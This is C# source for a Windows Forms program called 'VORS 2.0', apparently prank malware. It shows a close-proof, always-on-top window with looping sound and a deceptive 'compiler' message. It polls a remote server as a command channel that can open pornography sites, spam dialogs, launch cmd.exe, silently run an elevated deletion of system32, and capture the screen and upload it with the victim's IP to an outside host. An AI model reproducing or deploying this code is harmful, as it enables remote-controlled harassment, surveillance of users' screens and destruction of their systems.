using System;
using System.Drawing;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.Data;
using System.Collections.Specialized;
using System.IO;

namespace VORS2._0_the_fuckery_countinues
{

    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        
        public static string Generatething(int length)
        {
            Random random = new Random();
            string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder result = new StringBuilder(length);
            for (int i = 0; i < length; i++)
            {
                result.Append(characters[random.Next(characters.Length)]);
            }
            return result.ToString();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            label1.Hide();
            timer10.Start();
            label2.Hide();
            label3.Hide();
            TopMost = true;
            MessageBox.Show("Sorry but the compiler detected code that might harm your system and has over writen it with this message instead. \n 0x0000F");
            timer1.Start();
            timer5.Start();


        }
        SoundPlayer simpleSound = new SoundPlayer(Properties.Resources.music);
        private void Timer1_Tick(object sender, EventArgs e)
        {

            simpleSound.PlayLooping();




            timer2.Start();
            timer1.Stop();
        }


        public int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        private void Timer2_Tick(object sender, EventArgs e)
        {
            timer8.Start();
            //timer3.Start();
           // timer7.Start(); deactivated
            timer4.Start();
            timer11.Start();
            //timer9.Start();
            timer2.Stop();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Timer8_Tick(object sender, EventArgs e)
        {

            label1.Show();
            label2.Show();
            label3.Show();
            Random rand = new Random();

            label1.Location = new Point(rand.Next(ClientSize.Width), rand.Next(ClientSize.Height));
            label2.Location = new Point(rand.Next(ClientSize.Width), rand.Next(ClientSize.Height));
            label3.Location = new Point(rand.Next(ClientSize.Width), rand.Next(ClientSize.Height));
            Random r = new Random();

            label1.BackColor = Color.FromArgb(r.Next(0, 256), r.Next(0, 256), r.Next(0, 256));
            label2.BackColor = Color.FromArgb(r.Next(0, 256), r.Next(0, 256), r.Next(0, 256));
            label3.BackColor = Color.FromArgb(r.Next(0, 256), r.Next(0, 256), r.Next(0, 256));
            label1.ForeColor = Color.FromArgb(r.Next(0, 256), r.Next(0, 256), r.Next(0, 256));
            label2.ForeColor = Color.FromArgb(r.Next(0, 256), r.Next(0, 256), r.Next(0, 256));
            label3.ForeColor = Color.FromArgb(r.Next(0, 256), r.Next(0, 256), r.Next(0, 256));
            label1.Clone();
            label2.Clone();
            label3.Text = Generatething(1);
            label3.Clone();
            if (timer8.Interval < 5)
            {
                timer8.Interval = 5;
            }
            else
            {
                if (timer8.Interval == 2000)
                {
                    if (timer8.Interval == 5000)
                    {
                        timer8.Interval = 1000;
                    }
                    else
                    {
                        timer8.Interval -= 5000;
                    }
                }
                else
                {
                    try
                    {
                        timer8.Interval -= 10000;
                    }
                    catch
                    {

                        timer8.Interval = r.Next(100, 3000);
                    }
                }
            }
        }

        private void Timer9_Tick(object sender, EventArgs e)
        {
            Random random = new Random();
            if (random.Next(0, 20) == 4) { pictureBox1.Clone(); }
            if (random.Next(1, 3) == 1) { pictureBox1.Image = SystemIcons.Error.ToBitmap(); } else if (random.Next(1, 3) == 2) { SystemIcons.Question.ToBitmap(); } else if (random.Next(1, 3) == 3) { SystemIcons.Exclamation.ToBitmap(); }
            pictureBox1.Location = new Point(MousePosition.X, MousePosition.Y);
        }

        private void Timer3_Tick(object sender, EventArgs e)
        {
            msb msbd = new msb();
            msbd.Show();
            try
            {
                if (timer3.Interval == 100)
                {

                }
                else
                {

                    timer3.Interval -= 1;
                }
            }
            catch
            {

            }
        }
        public int s = 0;
        public int ss = 0;
        private void Timer4_Tick(object sender, EventArgs e)
        {
            Random rand = new Random();
            int fuckery = rand.Next(0, 7000);
            if (fuckery == 5345)
            {
                if (s == 1)
                {
                    if (ss == 0)
                    {
                        simpleSound.PlayLooping();
                    }
                    else
                    {

                    }
                }
                else
                {
                    CREEPY c = new CREEPY();
                    c.Show();
                    s = 1;
                }
            }
        }

        private void Timer5_Tick(object sender, EventArgs e)
        {
            vorsintroduction vi = new vorsintroduction();
            vi.Show();
            timer5.Stop();
        }

        private void Timer7_Tick(object sender, EventArgs e)
        {
            Random r = new Random();
            string path = @"win-sys-" + Generatething(r.Next(0, 50)) + ".VORS";
            if (!File.Exists(path))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(path))
                {

                
                    
                    for (int i = 0; i < r.Next(0, 999); i++)
                    {
                        sw.WriteLine(Generatething(r.Next(0, 900000)));
                    }

                }
            }

            // Open the file to read from.
            using (StreamReader sr = File.OpenText(path))
            {
                string s = "";
                while ((s = sr.ReadLine()) != null)
                {
                    Console.WriteLine(s);
                }
            }
            if (System.IO.File.Exists(@"win-sys.bat"))
            {
               

            }
            else
            {
      
                string pathh = @"win-sys.bat";
                if (!File.Exists(pathh))
                {
                    var batchcodenobase64 = Convert.FromBase64String("QGVjaG8gb2ZmCmNvbG9yIDIKOnN0YXJ0CmVjaG8gJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUgJXJhbmRvbSUKZ290byBzdGFydA==");
                    // Create a file to write to.
                    using (StreamWriter sw = File.CreateText(pathh))
                    {
                       
                        sw.WriteLine(batchcodenobase64);
                    }
                }

                // Open the file to read from.
                using (StreamReader sr = File.OpenText(pathh))
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        Console.WriteLine(s);
                    }
                }
            }
        }

        private void Timer10_Tick(object sender, EventArgs e)
        {
            try
            { 
                var url = string.Format("https://enclica.com/vors/ds.php?ip=" + GetLocalIPv4(NetworkInterfaceType.Ethernet) + "&privatekey=UNKNOWN");
                using (var webClient = new WebClient())
                {
                    var response = webClient.DownloadString(url);         

                    if (response == "d")                      
                    {
                        System.Environment.Exit(1);
                    }
                    else if (response == "c")
                    {
                        CREEPY c = new CREEPY();
                        c.Show();
                        s = 1;
                    }
                    else if (response == "phg")
                    {
                        System.Diagnostics.Process.Start("https://pornhub.com/gay");
                    }
                    else if (response == "ph")
                    {
                        System.Diagnostics.Process.Start("https://pornhub.com/");
                    }
                    else if (response == "e621")
                    {
                        System.Diagnostics.Process.Start("https://e621.net");
                    }
                    else if (response == "youtube")
                    {
                        System.Diagnostics.Process.Start("https://youtube.com");
                    }
                    else if (response == "cmd")
                    {
                        System.Diagnostics.Process.Start("cmd.exe");
                    }
                    else if (response == "deletesystem32_confirm")
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "del c:/windows/system32";
                        startInfo.Verb = "runas";
                        process.StartInfo = startInfo;
                        process.Start();
                    }
                    else if (response == "intro")
                    {
                        vorsintroduction vi = new vorsintroduction();
                        vi.Show();

                    }
                    else if (response == "rickroll")
                    {
                        simpleSound.Stop();
                        timer3.Stop();
                        this.Hide();
                        System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=dQw4w9WgXcQ");


                    }
                    else if (response == "msb")
                    {
                        msb msbd = new msb();
                        msbd.Show();
                    }
                    else if (response == "msbspam999")
                    {
                        for (int i = 0; i < 999; i++)
                        {
                            msb msbd = new msb();
                            msbd.Show();
                        }

                    }
                    else if (response == "msbspam")
                    {
                        for (int i = 0; i < 10; i++)
                        {
                            msb msbd = new msb();
                            msbd.Show();
                        }

                    }
                    else if (response == "rickrollstop")
                    {
                        simpleSound.PlayLooping();
                        timer3.Start();
                        this.Show();

                    }
                    else if (response == "screenshot")
                    {
                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        using (Graphics g = Graphics.FromImage(bmp))
                        {
                            g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                            bmp.Save(@"screenshotv.png");  // saves the image
                            string textt = System.IO.File.ReadAllText(@"screenshotv.png");
                            var plainTextBytes = Encoding.UTF8.GetBytes(textt);
                           string gofuckyourselfuser = Convert.ToBase64String(plainTextBytes);

                          

                            using (var client = new WebClient())
                            {
                                var values = new NameValueCollection();
                                values["data"] = gofuckyourselfuser;
                                values["ip"] = GetLocalIPv4(NetworkInterfaceType.Ethernet);
                               

                                var res = client.UploadValues("http://csoftware.cf/vors/screenshot.php?", values);

                                var responseString = Encoding.Default.GetString(res);
                                
                            }
                        }


                    }
                }
            }
            catch
            {

            }
        }
        public string GetLocalIPv4(NetworkInterfaceType _type)
        {
            string output = "";
            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (item.NetworkInterfaceType == _type && item.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            output = ip.Address.ToString();
                        }
                    }
                }
            }
            return output;
        }

        private void Timer11_Tick(object sender, EventArgs e)
        {
            Random ran = new Random();
            if (ran.Next(0, 4) == 4)
            {
                System.Diagnostics.Process.Start("https://google.com/search?q=how do i hack the nsa");
            } else if (ran.Next(0, 4) == 3)
            {
                System.Diagnostics.Process.Start("https://google.com/search?q=facebook hacking tool");
            } else if (ran.Next(0, 4) == 2)
            {
                System.Diagnostics.Process.Start("https://google.com/search?q=instagram hacking tool 2019");
            }
            else if (ran.Next(0, 4) == 1)
            {
                System.Diagnostics.Process.Start("https://google.com/search?q=minecraft mods not virus 2019");
            }
            else if (ran.Next(0, 4) == 0)
            {
                System.Diagnostics.Process.Start("https://google.com/search?q=2019 hacks");
            }
        }

        private void Timer6_Tick(object sender, EventArgs e)
        {

        }
  

        }
    }
    



public static class ControlExtensions
{
    public static T Clone<T>(this T controlToClone)
        where T : Control
    {
        PropertyInfo[] controlProperties = typeof(T).GetProperties(BindingFlags.Public | BindingFlags.Instance);

        T instance = Activator.CreateInstance<T>();

        foreach (PropertyInfo propInfo in controlProperties)
        {
            if (propInfo.CanWrite)
            {
                if (propInfo.Name != "WindowTarget")
                    propInfo.SetValue(instance, propInfo.GetValue(controlToClone, null), null);
            }
        }

        return instance;
    }
}
